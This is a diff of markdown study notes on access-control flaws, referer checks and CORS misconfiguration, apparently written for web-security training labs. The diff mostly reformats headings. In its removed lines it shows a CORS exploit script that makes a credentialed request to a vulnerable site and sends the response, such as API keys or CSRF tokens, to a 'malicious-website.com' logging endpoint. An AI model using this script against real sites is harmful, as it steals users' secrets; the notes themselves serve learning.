@@ -113,7 +113,8 @@ action=upgrade&confirmed=true&username=wiener
 Repeat the request while logged in as wiener
 ```
 
-### [Lab]: Referer-based access control
+### Referer-based access control
+#### [Lab]: Referer-based access control
 
 ```
 Login as administrator/admin
@@ -153,7 +154,7 @@ Circumvented using web proxies, VPNs, or manipulation of client-side geolocation
 - CORS protocol uses HTTP headers to define trusted web origin and authentication access.
 - These are combined in a header exchange between a browser and the cross-origin web site that it is trying to access.
 
-### ```Access-Control-Allow-Origin``` / ACAO response header
+### Access-Control-Allow-Origin response header
 
 ** ```normal-website.com``` sends the following cross-origin request: **
 
@@ -189,20 +190,6 @@ HTTP/1.1 200 OK
 Access-Control-Allow-Origin: https://malicious-website.com
 Access-Control-Allow-Credentials: true
 ...
-```
-
-If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:
-
-```
-var req = new XMLHttpRequest();
-req.onload = reqListener;
-req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
-req.withCredentials = true;
-req.send();
-
-function reqListener() {
-location='//malicious-website.com/log?key='+this.responseText;
-}; 
 ```
 
 #### [Lab]: CORS vulnerability with basic origin reflection
@@ -245,3 +232,5 @@ Submit exploit to victim and go to /log:
 ```
 
 ### Errors parsing Origin headers
+
+...
